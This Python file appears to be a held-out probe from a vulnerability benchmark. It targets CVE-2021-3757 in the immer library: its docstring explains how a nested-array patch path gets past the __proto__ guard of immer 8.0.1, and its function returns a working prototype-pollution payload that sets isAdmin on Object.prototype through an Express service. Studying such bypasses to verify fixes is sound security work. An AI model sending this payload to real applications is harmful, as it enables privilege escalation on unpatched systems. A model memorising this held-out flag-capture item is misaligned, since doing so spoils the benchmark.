#!/usr/bin/env python3
r"""[HELD-OUT] CVE-2021-3757 / CVE-2021-23436 residual -- nested-array (type-confusion) bypass of the
8.0.1 fix.

real-app-http: fired as REAL EXTERNAL HTTP against the running Express service:
  POST /apply  {"patches": [{"op":"replace","path":[["__proto__"],"isAdmin"],"value":true}]}
then GET /check observes whether Object.prototype was polluted. The service calls the REAL published immer
applyPatches({seeded:1}, patches) on the attacker JSON -- no in-process probe, no source-lift.

The CVE-2020-28477 fix (present on V1 = immer 8.0.1) guards each intermediate path segment with a strict
`===` STRING comparison of the RAW key and NO type coercion:

    var p = path[i];
    if ((parentType === Object || parentType === Array) &&
        (p === "__proto__" || p === "constructor")) die(24);

A patch path whose FIRST (intermediate) segment is itself an array -- `[["__proto__"], "isAdmin"]` -- makes
the dangerous key the ARRAY `["__proto__"]`. `["__proto__"] === "__proto__"` is FALSE (array vs string), so
the guard PASSES it; then the native deref `get(base, p)` = `base[["__proto__"]]` coerces the array back to
the string "__proto__" (Array.prototype.toString joins to "__proto__"), so the walk still steps onto
Object.prototype and the leaf assign writes `isAdmin = true` onto it = CWE-843 type confusion. A later GET
/check sees `({}).isAdmin === true` and releases the flag on V1.

This is CVE-2021-3757 / CVE-2021-23436, which GHSA-c36v-fmgq-m8hx states 'can lead to a bypass of
CVE-2020-28477 ... when the user-provided keys used in the path parameter are arrays'. Advisory PoC form:
applyPatches({}, [{op:'replace', path:[['__proto__'],'polluted'], value:'x'}]).

CVE-2021-3757 fix (V2 = immer 9.0.6) changes exactly one token -- `var p = "" + path[i]` -- coercing the key
to a string BEFORE the compare. The nested-array segment `["__proto__"]` becomes the string "__proto__", so
`p === "__proto__"` is TRUE -> die(24) BEFORE any deref/write -- the residual is rejected (POST /apply
blocked, /check stays null, no flag).

Contract: reaches the flag on V1; closed on V2.
"""
from __future__ import annotations


def candidate(flag: str) -> dict:
    """A POST /apply whose first patch-path segment is a NESTED ARRAY of the dangerous name."""
    return {
        "probe_id": "cve-2021-3757-nested-array-proto",
        "method": "POST",
        "path_route": "/apply",
        "patches": [{"op": "replace", "path": [["__proto__"], "isAdmin"], "value": True}],
    }


if __name__ == "__main__":
    print(candidate("PCBFLAG_demo"))
